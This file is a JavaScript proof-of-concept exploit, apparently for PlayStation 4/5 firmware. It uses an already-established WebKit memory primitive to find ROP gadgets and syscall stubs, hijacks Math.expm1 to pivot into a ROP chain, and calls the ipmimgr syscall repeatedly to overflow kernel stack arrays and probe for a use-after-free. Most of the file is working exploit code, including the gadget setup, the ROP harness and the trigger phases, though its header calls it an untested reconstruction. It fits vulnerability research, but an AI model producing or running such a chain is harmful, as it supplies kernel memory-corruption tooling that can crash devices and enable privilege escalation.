// ipmi_poc.js — oomfie reproduction + UAF observation
//
// WARNING — READ FIRST
//
// This is a static-analysis reconstruction. It has not been tested on
// hardware. Every struct layout, every field offset, and the exact shape
// of the syscall argument block are derived from the 13.02 kernel
// decompilation. They may not match the actual userspace ABI.
//
// On a real console this may:
//   - return EINVAL (22) for every command — argument block layout wrong
//   - return EPERM (1) — privilege gate we didn't see
//   - return ENOSYS (78) — syscall 622 not dispatched
//   - succeed partially, then panic on create-server — target behaviour
//   - panic immediately on the first connect — argument struct wrong
//
// Intended for the chain_poops environment: WebKit + primitive already
// established, JS issuing syscalls via the ROP harness. Will not run
// from a plain browser page or any sandboxed context.
//
// USAGE
//
// Copy this file into the fn_leak folder alongside core.js, mem.js,
// int64.js, and ps4_offsets.js. Then load an html wrapper with the
// following DOM elements:
//
//   <div id="out"></div>
//   <div id="state"></div>
//
// URL parameters override defaults:
//
//   ?n=72                queue 72, trigger, full phase 4-6
//   ?n=72&phase4=0       skip collision stress
//   ?n=72&phase5=0       skip teardown
//   ?n=63                control run, expect clean completion
//   ?n=78                last safe value, expect clean completion
//   ?n=79                canary trip, expect kernel panic
//
// Background
// ----------
//
// sys_ipmimgr is syscall 622.
//
// Command 0x400 (syscallConnectWithWaitServer) appends a ConnectRequest
// to the pending-connect list at [server_list + 0x38]. No length cap.
// Duplicate check requires both (server_id, uid) to match.
//
// Command 0 (syscallCreateServer):
//   - Walk pending list, write (server_id, uid) of each matching entry
//     into two adjacent 256-byte stack arrays. Unbounded index. Overflow
//     at N >= 64, canary at N >= 79.
//   - Allocate N new ConnectRequests, copy the (now possibly corrupted)
//     array values into ConnectRequest+0x18 and +0x1c.
//   - Link each into the new server's internal list.
//
// ConnectRequest free path is a bare uma_zfree. No unlink, no refcount.
// Identity collision is therefore a UAF precondition.

import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

// ---------------------------------------------------------------------------
// Tunables
// ---------------------------------------------------------------------------

const params = new URLSearchParams(location.search);

const N_REQUESTS = (function () {
    const q = params.get("n");
    if (q) {
        const n = parseInt(q, 10);
        if (Number.isFinite(n) && n >= 1 && n <= 200) return n;
    }
    return 72;
})();

const SERVER_NAME = params.get("name") || "SceOomfie";

const ENABLE_PHASE_4 = params.get("phase4") !== "0";
const ENABLE_PHASE_5 = params.get("phase5") !== "0";
const ENABLE_PHASE_6 = params.get("phase6") !== "0";

// ---------------------------------------------------------------------------
// Command numbers (verified from dispatch table)
// ---------------------------------------------------------------------------

const CMD_CREATE_SERVER       = 0x000;
const CMD_CONNECT_WAIT_SERVER = 0x400;

// Session family commands (from dispatch; purpose partly inferred)
const CMD_SESSION_STATE       = 0x463;
const CMD_SESSION_INFO        = 0x464;
const CMD_SESSION_PARAMS      = 0x465;
const CMD_SESSION_GET         = 0x466;
const CMD_SESSION_SERVER      = 0x467;
const CMD_SESSION_CONN        = 0x468;
const CMD_SESSION_DESTROY     = 0x469;
const CMD_SESSION_NAME        = 0x46A;
const CMD_SESSION_KILL        = 0x46B;

// ---------------------------------------------------------------------------
// Syscall numbers
// ---------------------------------------------------------------------------

const SYS = {
    getpid:  20,
    getuid:  0x18,
    close:   6,
    ipmimgr: 0x26e,
};

// ---------------------------------------------------------------------------
// DOM / logging
// ---------------------------------------------------------------------------

const outEl   = document.getElementById("out");
const stateEl = document.getElementById("state");
const lines   = [];
let   passCount = 0, failCount = 0;

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (typeof console !== "undefined") console.log(line);
    if (outEl) {
        const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
        outEl.innerHTML = lines.map(esc).join("\n");
        outEl.scrollTop = outEl.scrollHeight;
    }
}
function state(t, c) {
    if (stateEl) { stateEl.textContent = t; stateEl.className = c || ""; }
}
function check(name, ok, detail) {
    if (ok) { passCount++; mark("PROOF-OK",   name + (detail ? "  " + detail : "")); }
    else    { failCount++; mark("PROOF-FAIL", name + (detail ? "  " + detail : "")); }
    return ok;
}
function hx32(x) { return ("00000000" + ((x >>> 0).toString(16))).slice(-8); }
function hx64(v) { return "0x" + hx32(v.hi) + hx32(v.low); }

// ---------------------------------------------------------------------------
// Module state
// ---------------------------------------------------------------------------

let p = null;
let off = null;
let webkitBase = null, libkernelBase = null, errorFn = null;

const G = {};
const keepAlive = [];
let M = null;
let mainMf = null, mainOrig = null, mainArmed = false;
let pivotCell = null, pivotObj = null;
let argGadget = null;
const stubAddr = new Map();

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function bufAddr(ab) {
    const c = p.leakval(ab);
    return p.read8(
        p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
         .add32(off.wk_ArrayBuffer_m_contents_m_data)
    );
}

function put64(dv, at, value) {
    if (typeof value === "number") {
        dv.setUint32(at,     value >>> 0, true);
        dv.setUint32(at + 4, value < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at,     value.low >>> 0, true);
        dv.setUint32(at + 4, value.hi  >>> 0, true);
    }
}
function put32(dv, at, value) { dv.setUint32(at, value >>> 0, true); }

// ---------------------------------------------------------------------------
// Gadget + stub setup (adapted from chain_poops.js)
// ---------------------------------------------------------------------------

function setupGadgets() {
    const GAD = [
        ["POP_RDI_RET",        off.wk_POP_RDI_RET,        [0x5f, 0xc3]],
        ["POP_RSI_RET",        off.wk_POP_RSI_RET,        [0x5e, 0xc3]],
        ["POP_RDX_RET",        off.wk_POP_RDX_RET,        [0x5a, 0xc3]],
        ["POP_RCX_RET",        off.wk_POP_RCX_RET,        [0x59, 0xc3]],
        ["POP_R8_RET",         off.wk_POP_R8_RET,         [null, 0x58, 0xc3]],
        ["POP_R9_RET",         off.wk_POP_R9_RET,         [null, 0x59, 0xc3]],
        ["POP_RAX_RET",        off.wk_POP_RAX_RET,        [0x58, 0xc3]],
        ["LEAVE_RET",          off.wk_LEAVE_RET,          [0xc9, 0xc3]],
        ["MOV_RDI_RAX_RET",    off.wk_MOV_QWORD_PTR_RDI_RAX_RET,
                               [0x48, 0x89, 0x07, 0xc3]],
        ["G0",                 off.wk_MOV_RDI_RSI_30_CALL,
                               [0x48, 0x8b, 0x7e, 0x30]],
        ["G1",                 off.wk_POP_RAX_MOV_RAX_JMP_18,
                               [0x58, 0x48, 0x8b, 0x07]],
        ["G2",                 off.wk_PUSH_RBP_MOV_RBP_RSP_10,
                               [0x55, 0x48, 0x89, 0xe5]],
        ["G3",                 off.wk_MOV_RDI_RAX_8_CALL_20,
                               [0x48, 0x8b, 0x78, 0x08]],
        ["G4",                 off.wk_MOV_RDX_RAX_18_CALL_10,
                               [0x48, 0x8b, 0x50, off.pivot_view_sp]],
        ["G5",                 off.wk_PUSH_RDX_POP_RSP_RET,
                               [0x52, 0x5c, 0xc3]],
    ];
    let gated = 0;
    for (const [nm, rva, pat] of GAD) {
        const a = webkitBase.add32(rva);
        let good = true;
        for (let i = 0; i < pat.length; ++i) {
            if (pat[i] === null) continue;
            if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
        }
        if (good) { G[nm] = a; gated++; }
        else mark("GADGET-BAD", nm);
    }
    return gated === GAD.length;
}

function setupStubs() {
    const need = new Set(Object.values(SYS));
    let scanned = 0;
    for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
        const v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
        const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
        if (!need.has(num)) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        need.delete(num);
        scanned++;
    }
    if (off.k_stubs) {
        for (const numStr in off.k_stubs) {
            const num = +numStr, o = off.k_stubs[numStr];
            if (stubAddr.has(num)) continue;
            if (!Object.values(SYS).includes(num)) continue;
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
            stubAddr.set(num, libkernelBase.add32(o));
            need.delete(num);
        }
    }
    return { scanned, missing: [...need] };
}

// ---------------------------------------------------------------------------
// ROP harness
// ---------------------------------------------------------------------------

const PB_SIZE = () => Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);

function makeCtx() {
    const sb = new ArrayBuffer(0x20);
    const pb = new ArrayBuffer(PB_SIZE());
    const kb = new ArrayBuffer(0x2000);
    const fb = new ArrayBuffer(0x40);
    keepAlive.push(sb, pb, kb, fb);
    const c = {
        storeDv: new DataView(sb), pivotDv: new DataView(pb),
        stackDv: new DataView(kb), frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb)
    };
    keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                   c.stackU8, c.frameU8);
    c.S = bufAddr(sb); c.P = bufAddr(pb);
    c.K = bufAddr(kb); c.F = bufAddr(fb);
    put64(c.storeDv, 0x00, G.G1); put64(c.storeDv, 0x08, c.P);
    put64(c.storeDv, 0x10, G.G3); put64(c.storeDv, 0x18, G.G2);
    put64(c.pivotDv, 0x00, c.P); put64(c.pivotDv, 0x10, G.G5);
    put64(c.pivotDv, 0x20, G.G4);
    return c;
}

function layout(c, target, args) {
    c.stackU8.fill(0); c.frameU8.fill(0);
    const insts = [];
    for (let i = 0; i < args.length; ++i) {
        insts.push(argGadget[i]);
        insts.push(args[i]);
    }
    const targetIdx = insts.length;
    insts.push(target);
    insts.push(G.POP_RDI_RET); insts.push(c.F);
    insts.push(G.MOV_RDI_RAX_RET);
    insts.push(G.POP_RAX_RET);
    insts.push(new int64(0x0a, 0xfffffff7));
    insts.push(G.LEAVE_RET);
    let at = 0x2000 - 8 * insts.length;
    if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
    for (let i = 0; i < insts.length; ++i)
        put64(c.stackDv, at + 8 * i, insts[i]);
    put64(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
}

function callAddr(target, args) {
    layout(M, target, args);
    const saved = p.read8(pivotCell);
    p.write8(pivotCell, M.S);
    try { Math.expm1(pivotObj); } catch (e) { }
    p.write8(pivotCell, saved);
    return {
        lo:  M.frameDv.getUint32(0, true),
        hi:  M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0
    };
}
function sc(num, ...args) {
    const stub = stubAddr.get(num);
    if (!stub) throw new Error("no stub for syscall " + num);
    return callAddr(stub, args);
}
function errno() {
    const r = callAddr(errorFn, []);
    const a = new int64(r.lo, r.hi);
    return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
}

// ---------------------------------------------------------------------------
// Argument block wrappers
// ---------------------------------------------------------------------------

const ARGS_SIZE = 0x30;

function buildConnectInput(name, serverId) {
    const inAb   = new ArrayBuffer(0x40);
    const inDv   = new DataView(inAb);
    const nameAb = new ArrayBuffer(64);
    new TextEncoder().encodeInto(name, new Uint8Array(nameAb));

    const timeoutAb   = new ArrayBuffer(4);
    new DataView(timeoutAb).setUint32(0, 10000, true);

    const nameAddr    = bufAddr(nameAb);
    const timeoutAddr = bufAddr(timeoutAb);

    put64(inDv, 0x00, 1);
    put64(inDv, 0x08, Math.min(name.length + 1, 0x1FFF));
    put64(inDv, 0x10, 0);
    put64(inDv, 0x18, timeoutAddr);

    keepAlive.push(nameAb, timeoutAb);
    return { inAb, nameAddr, timeoutAddr };
}

function buildCreateInput(name) {
    const inAb = new ArrayBuffer(0x40);
    const inDv = new DataView(inAb);

    const nameAb = new ArrayBuffer(32);
    new TextEncoder().encodeInto(name, new Uint8Array(nameAb));

    const paramsAb = new ArrayBuffer(0x38);
    // Zeroed params passes all validation checks at +0x1c..+0x30.

    const nameAddr   = bufAddr(nameAb);
    const paramsAddr = bufAddr(paramsAb);

    put64(inDv, 0x00, 0);
    put64(inDv, 0x08, nameAddr);
    put64(inDv, 0x10, paramsAddr);

    keepAlive.push(nameAb, paramsAb);
    return { inAb };
}

function ipmimgrCall(cmd, serverId, inAb) {
    const argsAb = new ArrayBuffer(ARGS_SIZE);
    const argsDv = new DataView(argsAb);
    const outAb  = new ArrayBuffer(0x10);
    const outDv  = new DataView(outAb);
    keepAlive.push(argsAb, outAb);

    const argsAddr = bufAddr(argsAb);
    const inAddr   = inAb ? bufAddr(inAb) : 0;
    const outAddr  = bufAddr(outAb);

    put32(argsDv, 0x00, cmd);
    put32(argsDv, 0x08, serverId);
    put64(argsDv, 0x10, outAddr);
    put64(argsDv, 0x18, inAddr);
    put64(argsDv, 0x20, inAb ? inAb.byteLength : 0);

    const ret = sc(SYS.ipmimgr, argsAddr).i32;
    const err = (ret === -1) ? errno() : 0;
    const out0 = outDv.getUint32(0, true);
    const out4 = outDv.getUint32(4, true);

    return { ret, err, out0, out4 };
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

(async function () {
    try {
        const o = offsetsFor(navigator.userAgent);
        off = o.off;
        if (!off) { state("no offsets for firmware", "bad"); return; }

        function prettyFW(ua) {
            const m = /PlayStation\s+([45])[\/ ](\d+)\.(\d+)/.exec(ua || "");
            if (!m) return "non-PS";
            return "PS" + m[1] + "-" + m[2] + "." + m[3];
        }
        mark("FW", prettyFW(navigator.userAgent));
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", `N=${N_REQUESTS} name="${SERVER_NAME}" ` +
             `phase4=${ENABLE_PHASE_4} phase5=${ENABLE_PHASE_5} ` +
             `phase6=${ENABLE_PHASE_6}`);

        state("establishing primitive...", "warn");
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d) => mark("PRIM-" + t, d || "")
        });
        installWindowP(carrier, {
            promote: true,
            onEvent: (t, d) => mark("PAIR-" + t, d || "")
        });
        if (!window.p) throw new Error("window.p not installed");
        p = window.p;
        mark("PRIMITIVE-OK");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(
            p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function)
        );
        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + hx64(webkitBase) +
             " libkernel=" + hx64(libkernelBase));

        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("bases-aligned",
                   aligned(webkitBase) && aligned(libkernelBase)))
            return;

        if (!check("gadgets", setupGadgets())) return;
        argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                     G.POP_RCX_RET, G.POP_R8_RET,  G.POP_R9_RET];

        const sr = setupStubs();
        mark("STUBS", "scanned=" + sr.scanned +
             (sr.missing.length ? " missing=" + sr.missing.join(",") : ""));
        if (!check("stubs", sr.missing.length === 0)) return;

        M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        pivotObj = {};
        keepAlive.push(pivotObj);
        pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;

        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0,
              "pid=" + pid + " uid=" + sc(SYS.getuid).i32);

        // ===================================================================
        // PHASE 1 — baseline
        // ===================================================================

        mark("");
        mark("PHASE-1", "baseline create-server (no pending)");
        state("phase 1: baseline...", "warn");

        const baseline = ipmimgrCall(
            CMD_CREATE_SERVER, 0, buildCreateInput(SERVER_NAME).inAb);
        mark("CREATE-BASELINE",
             "ret=" + baseline.ret + " err=" + baseline.err +
             " out0=0x" + hx32(baseline.out0) +
             " out4=0x" + hx32(baseline.out4));

        if (baseline.err === 78) { state("ENOSYS", "bad"); return; }
        if (baseline.err === 1)  { state("EPERM", "bad");  return; }
        if (baseline.err === 22) {
            state("EINVAL — layout wrong", "bad");
            mark("STOP", "argument block layout doesn't match kernel. " +
                 "Phases 2+ won't help.");
            return;
        }

        // ===================================================================
        // PHASE 2 — queue N connect requests
        // ===================================================================

        mark("");
        mark("PHASE-2", `queue ${N_REQUESTS} connect requests`);
        state(`phase 2: queueing ${N_REQUESTS}...`, "warn");

        let ok = 0, fail = 0;
        for (let i = 1; i <= N_REQUESTS; i++) {
            const { inAb } = buildConnectInput(SERVER_NAME, i);
            const r = ipmimgrCall(CMD_CONNECT_WAIT_SERVER, i, inAb);
            const show = (i <= 3) || (i > N_REQUESTS - 3) || (i === 64);
            if (show) {
                mark("CONNECT",
                     `[${i}/${N_REQUESTS}] sid=${i}` +
                     ` ret=${r.ret} err=${r.err}` +
                     ` out=0x${hx32(r.out0)}`);
            } else if (i === 4) {
                mark("CONNECT", "...");
            }
            if (r.ret < 0) { fail++; if (fail > 4) break; }
            else ok++;
        }
        mark("CONNECT-TOTAL", `ok=${ok} fail=${fail}`);

        if (ok < 64) {
            state("phase 2 short", "bad");
            mark("STOP", `only ${ok} queued; overflow needs 64+. ` +
                 `check connect input struct.`);
            return;
        }

        // ===================================================================
        // PHASE 3 — trigger overflow
        // ===================================================================

        mark("");
        mark("PHASE-3", `create-server with ${ok} pending`);
        state("phase 3: triggering overflow...", "warn");

        const trigger = ipmimgrCall(
            CMD_CREATE_SERVER, 0, buildCreateInput(SERVER_NAME).inAb);
        mark("CREATE-TRIGGER",
             "ret=" + trigger.ret + " err=" + trigger.err +
             " out0=0x" + hx32(trigger.out0) +
             " out4=0x" + hx32(trigger.out4));

        if (trigger.ret < 0) {
            mark("PHASE-3-FAILED",
                 "trigger returned error " + trigger.err +
                 " — create input struct likely wrong");
            state("phase 3 failed", "bad");
            return;
        }
        mark("PHASE-3-OK",
             "stack arrays overflowed. canary intact (N<79). " +
             "corrupted ConnectRequests now linked into server " +
             "out0=0x" + hx32(trigger.out0));

        const serverHandle = trigger.out0;

        // ===================================================================
        // PHASE 4 — stress the corrupted identity space
        //
        // The second loop in create-server allocates N ConnectRequests and
        // copies corrupted array values into their +0x18 / +0x1c fields.
        // For indices >= 64, the values come from a different entry
        // (array_A[64..71] were clobbered by array_B[0..7], and vice
        // versa). This phase calls connect again with server_ids that
        // match the corrupted values, to force identity resolution.
        //
        // Not verified — inference only.
        // ===================================================================

        if (ENABLE_PHASE_4) {
            mark("");
            mark("PHASE-4", "stress corrupted identities");
            state("phase 4: resolving corrupted identities...", "warn");

            for (let i = 0; i < 8; i++) {
                const sid = 64 + i;
                const { inAb } = buildConnectInput(SERVER_NAME, sid);
                const r = ipmimgrCall(CMD_CONNECT_WAIT_SERVER, sid, inAb);
                mark("CONNECT-STRESS",
                     `[${i}] sid=${sid} ret=${r.ret} err=${r.err}` +
                     ` out=0x${hx32(r.out0)}`);

                if (r.err === 0x44f) {
                    mark("COLLISION-DETECTED",
                         "duplicate check fired for sid=" + sid);
                }
            }
        }

        // ===================================================================
        // PHASE 5 — session teardown
        //
        // Attempt to destroy the server/session, which should free the
        // ConnectRequests it owns. If the corrupted entries are still
        // referenced elsewhere (pending list, another server's list),
        // the free leaves a dangling reference.
        //
        // Not verified — inference only.
        // ===================================================================

        if (ENABLE_PHASE_5) {
            mark("");
            mark("PHASE-5", "session/server teardown");
            state("phase 5: tearing down...", "warn");

            const teardownCmds = [
                { cmd: CMD_SESSION_DESTROY, sid: serverHandle },
                { cmd: CMD_SESSION_KILL,    sid: serverHandle },
                { cmd: CMD_SESSION_GET,     sid: serverHandle },
            ];

            for (const { cmd, sid } of teardownCmds) {
                const r = ipmimgrCall(cmd, sid,
                                      buildCreateInput(SERVER_NAME).inAb);
                mark("TEARDOWN",
                     "cmd=0x" + cmd.toString(16) +
                     " sid=0x" + hx32(sid) +
                     " ret=" + r.ret + " err=" + r.err +
                     " out=0x" + hx32(r.out0) + "/" + hx32(r.out4));
            }
        }

        // ===================================================================
        // PHASE 6 — observation
        //
        // After teardown, perform a fresh IPMI operation. If a
        // ConnectRequest was freed while still referenced, the fresh
        // operation walks the freed list, dereferences freed memory, and
        // either panics or returns unexpected values.
        // ===================================================================

        if (ENABLE_PHASE_6) {
            mark("");
            mark("PHASE-6", "post-teardown observation");
            state("phase 6: observing...", "warn");

            const post = ipmimgrCall(
                CMD_CREATE_SERVER, 0,
                buildCreateInput("SceAfter").inAb);
            mark("POST-CREATE",
                 "ret=" + post.ret + " err=" + post.err +
                 " out0=0x" + hx32(post.out0) +
                 " out4=0x" + hx32(post.out4));

            const fresh = ipmimgrCall(
                CMD_CONNECT_WAIT_SERVER, 0x1000,
                buildConnectInput(SERVER_NAME, 0x1000).inAb);
            mark("POST-CONNECT",
                 "ret=" + fresh.ret + " err=" + fresh.err +
                 " out=0x" + hx32(fresh.out0));

            // If either returned cleanly, the freed memory was likely
            // reclaimed with harmless data and no UAF fired. If a panic
            // occurred, the log ends here and the console reboots.
        }

        // ===================================================================
        // Summary
        // ===================================================================

        mark("");
        mark("SUMMARY", `pass=${passCount} fail=${failCount}`);
        mark("OUTCOME",
             "if the log reaches this point without a reboot, the UAF " +
             "did not fire under these parameters. if the console " +
             "rebooted, the UAF likely fired.");

        state(passCount > 0 && failCount === 0
              ? "COMPLETED"
              : "COMPLETED (with failures)",
              passCount > 0 ? "ok" : "warn");

    } catch (e) {
        mark("THREW", (e && e.message) ? e.message : String(e));
        state("FAILED", "bad");
    } finally {
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("RESTORE-THREW", e.message); }
    }
})();